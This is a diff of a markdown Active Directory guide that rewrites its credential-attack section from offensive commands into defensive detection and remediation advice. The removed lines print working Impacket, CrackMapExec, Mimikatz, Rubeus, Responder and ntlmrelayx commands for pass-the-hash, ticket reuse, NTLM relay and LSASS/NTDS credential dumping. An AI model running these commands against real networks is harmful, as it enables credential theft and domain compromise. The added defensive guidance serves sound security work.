@@ -188,109 +188,47 @@ ldapsearch -H ldap://DC01 -x -b "DC=corp,DC=local" \
 ---
 
 ## Credential Attacks
-
+ 
+Credential abuse includes password guessing, stolen credential reuse, authentication relay, and secret extraction. These techniques overlap in telemetry; investigate the account, endpoint, protocol, and sequence rather than labeling a single event as proof.
+ 
+```mermaid
+flowchart LR
+    A[Authentication anomalies<br/>and endpoint alerts] --> B[Correlate account,<br/>source host, and service]
+    B --> C{Credential exposure<br/>or reuse supported?}
+    C -->|Unclear| D[Preserve evidence<br/>and gather context]
+    C -->|Likely| E[Follow incident plan:<br/>contain host and protect identity]
+    E --> F[Recover credentials<br/>and review access]
+    F --> G[Verify controls,<br/>monitor, and document]
+```
+ 
 ### Password Spraying
-
-```powershell
-# Review the effective domain policy and confirm written engagement scope first.
-Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
-```
-
-For an explicitly approved exercise, use only designated test accounts and the
-approved test credential with a tool configuration reviewed by the engagement
-lead. Validate the effective lockout threshold, observation window, and each
-account's remaining bad-password allowance through the client's approved method.
-Do not bypass confirmation prompts or use an unreviewed custom user list. If policy,
-account state, or monitoring is uncertain, do not run a spray; stop and coordinate
-with the client. Keep the test within written scope and record the approved attempt
-limit, window, and stop condition.
-
+ 
+Review authentication failures across accounts and sources, then correlate any successful sign-ins and follow-on access. Consider lockout policy, authentication method, expected service activity, and approved testing windows. A high count alone can be caused by stale applications or misconfigured services; do not treat it as an automatic compromise verdict.
+ 
 ### Pass-the-Hash (PtH)
-
-```bash
-# Authenticate using NTLM hash instead of plaintext password
-# Requires: NTLM hash of target account
-
-# Impacket psexec
-python3 psexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
-
-# Impacket smbexec (noisier, writes service)
-python3 smbexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
-
-# Impacket wmiexec (no service install)
-python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
-
-# CrackMapExec (enumerate / spray hashes)
-crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
-crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --sam   # Dump SAM
-crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH -x "whoami"
-```
-
-> [!NOTE]
-> **CrackMapExec is deprecated.** The original project was archived in 2023 and
-> continues as **NetExec** (`nxc`) — a maintained drop-in replacement with the
-> same syntax (e.g. `nxc smb 192.168.1.0/24 -u Administrator -H NTLM_HASH`). The
-> `crackmapexec` commands in this guide work identically under `nxc`.
-
+ 
+This describes authentication using reusable NTLM credential material. Defenders should investigate unusual NTLM network logons, source-to-destination patterns, privileged account use from workstations, and subsequent service or process activity. Event 4624 with NTLM is a lead, not proof of hash reuse.
+ 
 ### Pass-the-Ticket (PtT)
-
-```powershell
-# Import a Kerberos ticket into current session
-# Requires: .kirbi or .ccache file
-
-# Mimikatz
-kerberos::ptt ticket.kirbi
-kerberos::list
-
-# Rubeus
-.\Rubeus.exe ptt /ticket:ticket.kirbi
-.\Rubeus.exe klist
-```
-
+ 
+A reused Kerberos ticket can appear as otherwise valid authentication. Review ticket-related events with endpoint context, account logon patterns, device identity, privilege, and the intended service. Protecting a ticket-granting ticket does not remove every risk: application service tickets and supplied credentials have separate protection considerations.
+ 
 ### NTLM Relay
-
-```bash
-# Capture and relay NTLM authentication to another service
-# Requires: NTLM auth not required to be signed on target
-
-# Setup responder to capture hashes
-sudo responder -I eth0 -wdF
-
-# Relay with ntlmrelayx (simultaneously)
-# Disable SMB/HTTP in Responder.conf first
-python3 ntlmrelayx.py -tf targets.txt -smb2support
-
-# LDAP relay delegation example; this does not create a new user or add one
-# to Domain Admins. The flags act on the relayed computer account and the
-# named existing user. Use only in an explicitly authorized, isolated lab.
-# -tf expects a file path; use -t for a single target with scheme prefix
-python3 ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --delegate-access --escalate-user COMPUTER$
-
-# With --no-http-server and --no-smb-server if needed
-```
-
+ 
+Relay risk depends on protocol and service configuration. Review unexpected NTLM authentication, name-resolution activity, destination services, and whether the server requires the relevant signing or channel-binding protections.
+ 
+- Enforce SMB signing where supported and verify effective policy.
+- For LDAP, assess signing and channel binding together with the actual bind and transport type. Microsoft notes that LDAP signing alone does not prevent NTLM relay in every scenario.
+- Reduce or disable NTLM only through a compatibility-tested, organization-managed migration plan.
+ 
+See Microsoft's [SMB signing overview](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing) and [LDAP channel-binding guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding).
+ 
 ### Credential Dumping
-
-```powershell
-# Mimikatz - dump credentials from LSASS
-privilege::debug
-sekurlsa::logonpasswords           # Cleartext + hashes from LSASS
-sekurlsa::wdigest                  # WDigest (cleartext if enabled)
-sekurlsa::kerberos                 # Kerberos tickets
-lsadump::sam                       # SAM database (local accounts)
-lsadump::lsa /patch                # LSA secrets
-lsadump::dcsync /domain:corp.local /user:krbtgt  # DCSync
-
-# CrackMapExec credential dumping
-crackmapexec smb TARGET -u Admin -p Pass --ntds     # Dump NTDS.dit via VSS
-crackmapexec smb TARGET -u Admin -p Pass --lsa      # Dump LSA secrets
-
-# Secretsdump (Impacket) - remote NTDS dump
-python3 secretsdump.py corp/Administrator@DC01 -hashes :HASH
-python3 secretsdump.py corp/Administrator@DC01 -outputfile hashes.txt
-```
-
----
+ 
+Treat unusual access to LSASS, credential stores, the SAM, or domain-controller databases as a high-priority investigation signal. Correlate process identity, signer, host role, user activity, security-product telemetry, and approved administration. Credential Guard and LSA protection reduce some credential-theft paths but have platform and application dependencies; Credential Guard does not protect the AD database on domain controllers or every supplied credential. Review Microsoft's [Credential Guard overview](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/) and [LSA protection guidance](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection).
+ 
+If exposure is suspected, preserve relevant logs and follow the organization's incident-response plan for host isolation, credential/session recovery, and domain-level remediation. Avoid ad hoc password changes on domain controllers; forest-level recovery actions require the current Microsoft procedure and healthy replication.
+ 
 
 ## Kerberos Attacks
 
